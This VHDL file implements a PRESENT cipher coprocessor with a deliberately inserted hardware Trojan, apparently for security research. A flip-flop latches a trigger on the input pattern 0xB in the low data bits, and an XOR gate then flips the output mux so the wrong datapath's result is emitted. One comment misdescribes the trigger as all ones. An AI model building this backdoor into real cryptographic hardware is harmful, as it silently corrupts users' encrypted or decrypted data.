library ieee;
use ieee.std_logic_1164.all;
use ieee.numeric_std.all;

-- Trojan 3: trigger = Specific bit pattern (1011 = 0xB) of the Least Significant bits of the input data
-- payload = write the output data of the incorrect/unselected datapath(NOT mode_sel(0)) onto the output data bus

entity present_Trojan3 is
        port (
                clk      : in std_logic;
                rst      : in std_logic;
                ena      : in std_logic;

                mode_sel : in std_logic_vector(1 downto 0);
                key      : in std_logic_vector(127 downto 0);
                data_in  : in std_logic_vector(63 downto 0);
                data_out : out std_logic_vector(63 downto 0);
                ready    : out std_logic
        );
end entity present_Trojan3;

architecture rtl of present_Trojan3 is
        signal  key_sched_out,
                key_mem_out : std_logic_vector(63 downto 0);

         signal current_round,
                mem_address : std_logic_vector(4 downto 0);

        signal  enc_ena,
                dec_ena : std_logic;

        signal  mem_wr_ena : std_logic;

        signal  ciphertext,
                plaintext,
                mux_out : std_logic_vector(63 downto 0);

        signal  key_sched_ena,
                out_ena,
                load_ena        : std_logic;

        signal  trojan_trig,
                trojan_mux_sel,
                trojan_ff_out   : std_logic;
begin
        -- mode_sel(1) = 1 -> 128-bit key, 0 -> 80-bit key
        -- mode_sel(0) = 1 -> Decrypt, 0 -> Encrypt       

        control_unit : entity work.present_control_unit
                port map(
                        -- inputs
                        clk      => clk,
                        rst      => rst,
                        ena      => ena,
                        op_sel => mode_sel(0),

                        round_counter_val => current_round,
                        mem_addr          => mem_address,
                        mem_wr_ena        => mem_wr_ena,

                        enc_ena  => enc_ena,
                        dec_ena  => dec_ena,
                        load_ena => load_ena,

                        key_sched_ena => key_sched_ena,
                        out_ena       => out_ena,
                        ready         => ready
                );

        key_sched : entity work.key_schedule_top
                port map(
                        clk               => clk,
                        rst               => rst,
                        ena               => key_sched_ena,
                        mode              => mode_sel(1),
                        input_key         => key,
                        output_key        => key_sched_out,
                        round_counter_val => current_round
                );

        round_key_mem : entity work.key_mem
                port map(
                        clk      => clk,
                        addr     => mem_address,
                        data_in  => key_sched_out,
                        wr_ena   => mem_wr_ena,
                        data_out => key_mem_out
                );

        enc_dp : entity work.present_enc
                port map(
                        clk        => clk,
                        rst        => rst,
                        ena        => enc_ena,
                        load_ena   => load_ena,
                        plaintext  => data_in,
                        round_key  => key_mem_out,
                        ciphertext => ciphertext
                );

        dec_dp : entity work.present_dec
                port map(
                        clk        => clk,
                        rst        => rst,
                        ena        => dec_ena,
                        load_ena   => load_ena,
                        ciphertext => data_in,
                        round_key  => key_mem_out,
                        plaintext  => plaintext
                );
        
        -- trigger when the LSBits of the input data are all ones
        trojan_trig <= '1' when data_in(3 downto 0) = x"B" else '0';
        
        -- need a flip-flop to store the **trojan's state** (i.e. trigger condition satisfied or not),
        -- since during normal operation the input data will change before entering DONE state
        -- (i.e. when the round counter is equal to 31 for encryption and 0 for decryption).
        -- The new data might not satisfy the Trojan triggering condition, which will cause
        -- the deactivation of the Trojan before its payload is executed, thus the correct datapath's data 
        -- will be written onto the output data bus.
        -- We use the load_ena signal as the trojan FF enable signal, since this signal goes high only when
        -- in DONE state (and after leaving KEY_GEN state).
        -- This way the trojan will "remember" its state until a crypto operation is DONE, and not change
        -- during an encryption/decryption due to a change on the data input bus.
        trojan_ff : entity work.dflip_flop
                port map(
                        clk => clk,
                        ena => load_ena,
                        rst => rst,
                        d => trojan_trig,               -- store current trojan status
                        q => trojan_ff_out
                );
        
        -- trojan payload XOR gate to invert the output multiplexer's select signal, in order for the
        -- unselected datapath's output data to be written on the data_out bus.
        trojan_xor : entity work.xor_2
               port map(
                        a => trojan_ff_out,
                        b => dec_ena,
                        y => trojan_mux_sel
               );

        -- mux controlling the input of the output register. Depending on the value of mode_sel(0)
        -- (0 for encryption, 1 for decryption), pass the output of the corresponding datapath to 
        -- the output register's input.
        out_mux : entity work.mux
                generic map(
                        DATA_WIDTH => 64
                )
                port map(
                        input_A => ciphertext,
                        input_B => plaintext,
                        sel     => trojan_mux_sel,                        
                        mux_out => mux_out
                );

        -- Coprocessor-global output register, in order to preserve the computed output data,
        -- until new ones are available. This can be helpful when a device reading from
        -- the coprocessor's output, reads with a rate less than the data output rate.
        out_reg : entity work.reg
                generic map(
                        DATA_WIDTH => 64
                )
                port map(
                        clk  => clk,
                        ena  => out_ena,
                        rst  => rst,
                        din  => mux_out,
                        dout => data_out
                );                             
end architecture;